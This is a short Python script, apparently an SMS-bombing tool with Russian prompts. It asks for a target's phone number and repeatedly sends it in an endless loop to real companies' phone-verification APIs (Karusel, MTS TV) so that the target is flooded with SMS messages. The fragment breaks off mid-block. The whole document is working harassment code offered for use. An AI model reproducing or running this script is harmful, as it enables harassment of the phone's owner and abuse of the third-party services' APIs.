import requests

phone = input('Введите номер на который придет СМС (79679148809>')

phone9 = phone[1:]

while True:

try:

requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})

print('[+] Karusel отправлено!')

except:

print('[-] Не отправлено!')

try:

requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})

print('[+] билайн отправлено!')

except: